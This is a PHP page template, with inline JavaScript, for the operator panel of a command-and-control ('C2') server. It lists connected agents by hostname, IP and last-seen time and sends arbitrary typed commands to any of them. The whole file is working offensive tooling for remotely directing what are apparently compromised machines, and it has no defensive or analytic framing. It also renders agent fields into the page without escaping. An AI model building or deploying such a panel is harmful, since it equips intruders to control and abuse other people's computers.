<?php ob_start(); ?>
<div>
    <h1 class="text-3xl font-bold gradient-text mb-6">🌍 Global Cosmic C2 Server</h1>
    <div class="glass p-4 rounded-2xl">
        <div class="flex gap-4 mb-4">
            <button class="glass px-4 py-2 rounded" onclick="fetchAgents()"><i class="fas fa-sync"></i> Refresh</button>
        </div>
        <div id="agentsList" class="space-y-2">Loading agents...</div>
    </div>
</div>
<script>
async function fetchAgents() {
    let res = await fetch('/c2/agents');
    let data = await res.json();
    let html = '<table class="w-full"><thead><tr><th>ID</th><th>Hostname</th><th>IP</th><th>Last Seen</th><th>Action</th></tr></thead><tbody>';
    (data.agents || []).forEach(a => {
        html += `<tr><td>${a.id}</td><td>${a.hostname}</td><td>${a.ip}</td><td>${a.last_seen}</td><td><button onclick="sendCommand(${a.id})" class="text-purple-400">Send Cmd</button></td></tr>`;
    });
    html += '</tbody></table>';
    document.getElementById('agentsList').innerHTML = html;
}
function sendCommand(id) {
    let cmd = prompt('Enter command:');
    if(cmd) fetch('/c2/agent/command', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:`agent_id=${id}&command=${encodeURIComponent(cmd)}`}).then(()=>alert('Command sent'));
}
fetchAgents();
</script>
<?php $content = ob_get_clean(); require_once __DIR__ . '/../layout.php'; ?>
